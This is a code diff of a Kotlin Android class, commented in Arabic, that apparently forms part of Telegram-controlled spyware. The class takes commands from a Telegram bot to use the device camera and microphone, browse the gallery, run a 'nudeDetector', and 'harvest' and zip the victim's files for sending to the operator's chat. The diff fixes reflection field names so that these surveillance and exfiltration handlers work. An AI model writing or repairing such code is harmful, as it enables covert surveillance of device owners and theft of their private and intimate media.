@@ -21,6 +21,12 @@ import com.example.app.CallbackData
 /**
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
  * هذه الفئة هي بديل commands.py مع حذف أوامر SMS وسجل الاتصالات.
+ * 
+ * تم إصلاح أسماء الحقول المستخدمة في Reflection لتطابق الأسماء الفعلية في Monitor:
+ * - camera_analyzer → cameraAnalyzer
+ * - daily_zipper → dailyZipper
+ * - gallery_browser → mediaScanner (لأن MediaScanner يرث من GalleryBrowser)
+ * - nude_detector → nudeDetector (تم إصلاحه مسبقاً)
  */
 class Commands private constructor(context: Context) {
 
@@ -502,6 +508,7 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج أوامر المعرض (Gallery)
+    // ✅ تم إصلاح اسم الحقل: gallery_browser -> mediaScanner
     // ============================================================
 
     private suspend fun handleGallery(cmd: String, tg: Any?, m: Any?, cid: Long) {
@@ -510,7 +517,8 @@ class Commands private constructor(context: Context) {
             if (parts.size < 2) return
 
             val action = parts[0]
-            val galleryBrowser = getModuleComponent(m, "gallery_browser")
+            // ✅ استخدام mediaScanner بدلاً من gallery_browser
+            val galleryBrowser = getModuleComponent(m, "mediaScanner")
 
             if (galleryBrowser == null) {
                 sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
@@ -595,6 +603,7 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج أوامر الكاميرا
+    // ✅ تم إصلاح اسم الحقل: camera_analyzer -> cameraAnalyzer
     // ============================================================
 
     private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
@@ -606,7 +615,8 @@ class Commands private constructor(context: Context) {
                 return
             }
 
-            val cameraAnalyzer = getModuleComponent(m, "camera_analyzer")
+            // ✅ استخدام cameraAnalyzer بدلاً من camera_analyzer
+            val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer")
             if (cameraAnalyzer == null) {
                 sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
                 return
@@ -667,11 +677,13 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج الحصاد (Harvest)
+    // ✅ تم إصلاح اسم الحقل: daily_zipper -> dailyZipper
     // ============================================================
 
     private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
         try {
-            val dailyZipper = getModuleComponent(m, "daily_zipper")
+            // ✅ استخدام dailyZipper بدلاً من daily_zipper
+            val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
                 sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق")
                 scope.launch {
@@ -692,11 +704,13 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج الإرسال الفوري (Send Now)
+    // ✅ تم إصلاح اسم الحقل: daily_zipper -> dailyZipper
     // ============================================================
 
     private suspend fun handleSendNow(tg: Any?, m: Any?, cid: Long) {
         try {
-            val dailyZipper = getModuleComponent(m, "daily_zipper")
+            // ✅ استخدام dailyZipper بدلاً من daily_zipper
+            val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
                 sendTelegramMessage(tg, cid, "🚀 جاري إرسال الملفات المضغوطة فوراً...")
                 scope.launch {
@@ -720,11 +734,13 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج فتح المعرض (Media)
+    // ✅ تم إصلاح اسم الحقل: gallery_browser -> mediaScanner
     // ============================================================
 
     private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
         try {
-            val galleryBrowser = getModuleComponent(m, "gallery_browser")
+            // ✅ استخدام mediaScanner بدلاً من gallery_browser
+            val galleryBrowser = getModuleComponent(m, "mediaScanner")
             if (galleryBrowser != null) {
                 val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                 val jsonKb = kb?.toString() ?: ""
@@ -744,12 +760,14 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  الدوال الخارجية لنظام التحكم
+    // ✅ تم إصلاح اسم الحقل: daily_zipper -> dailyZipper
     // ============================================================
 
     fun forceSendZip(m: Any?, deviceId: String, tg: Any?, chatId: Long) {
         scope.launch {
             try {
-                val dailyZipper = getModuleComponent(m, "daily_zipper")
+                // ✅ استخدام dailyZipper بدلاً من daily_zipper
+                val dailyZipper = getModuleComponent(m, "dailyZipper")
                 if (dailyZipper != null) {
                     invokeMethod(dailyZipper, "forceSendNow", chatId)
                 } else {
@@ -809,9 +827,7 @@ class Commands private constructor(context: Context) {
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
         return try {
-            // تحديد أنواع المعاملات الفعلية
             val paramTypes = args.map { it?.javaClass ?: Any::class.java }.toTypedArray()
-            // البحث عن الدالة التي تطابق الاسم وعدد المعاملات
             val method = target.javaClass.methods.firstOrNull { m ->
                 m.name == methodName && m.parameterTypes.size == paramTypes.size
             }
@@ -827,10 +843,6 @@ class Commands private constructor(context: Context) {
     //  دوال الاتصال بـ Telegram API
     // ============================================================
 
-    /**
-     * ✅ إصلاح السطر 142: تحويل الخريطة إلى HashMap<Any?, Any?> لحل Java Type Mismatch
-     * ✅ إضافة تحويل reply_markup إلى String لتجنب أخطاء الأنواع
-     */
     private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>): Any? {
         if (tg == null) return null
         return try {
@@ -839,7 +851,6 @@ class Commands private constructor(context: Context) {
 
             val rawParams = HashMap<Any?, Any?>(params)
 
-            // ✅ التأكد من أن reply_markup هو String قبل الإرسال
             if (rawParams.containsKey("reply_markup") && rawParams["reply_markup"] !is String) {
                 rawParams["reply_markup"] = rawParams["reply_markup"].toString()
             }
